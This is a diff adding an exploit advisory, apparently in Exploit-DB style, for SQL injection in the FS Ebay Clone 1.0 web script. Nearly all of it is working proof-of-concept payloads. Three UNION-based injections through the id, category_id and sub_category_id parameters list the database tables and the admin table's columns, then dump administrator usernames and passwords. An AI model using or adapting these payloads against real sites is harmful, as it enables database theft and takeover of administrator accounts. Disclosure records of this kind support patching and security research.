@@ -1,0 +1,43 @@
+# # # # # 
+# Exploit Title: FS Ebay Clone 1.0 - SQL Injection
+# Dork: N/A
+# Date: 08.12.2017
+# Vendor Homepage: https://fortunescripts.com/
+# Software Link: https://fortunescripts.com/product/ebay-clone/
+# Demo: http://ebay-clone.demonstration.co.in/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# http://localhost/[PATH]/product.php?id=[SQL]
+# 
+# -9++UNION(SELECT(1),(2),(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE()),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17),(18),(19),(20))--+-
+# 
+# http://server/product.php?id=-9++UNION(SELECT(1),(2),(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE()),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17),(18),(19),(20))--+-
+# 
+# 2)
+# http://localhost/[PATH]/search.php?category_id=1&sub_category_id=[SQL]
+# 
+# -1++UNION(SELECT(1),(2),(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x61646d696e),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16))--+-
+# 
+# http://server/search.php?category_id=1&sub_category_id=-1++UNION(SELECT(1),(2),(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x61646d696e),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16))--+-
+# 
+# 3)
+# http://localhost/[PATH]/search.php?category_id=[SQL]
+# 
+# -1++UNION(SELECT(1),(2),(SELECT+GROUP_CONCAT(id,username,password+SEPARATOR+0x3c62723e)+FROM+admin),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16))--+-
+# 
+# http://server/search.php?category_id=-1++UNION(SELECT(1),(2),(SELECT+GROUP_CONCAT(id,username,password+SEPARATOR+0x3c62723e)+FROM+admin),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16))--+-
+# 
+# # # # #
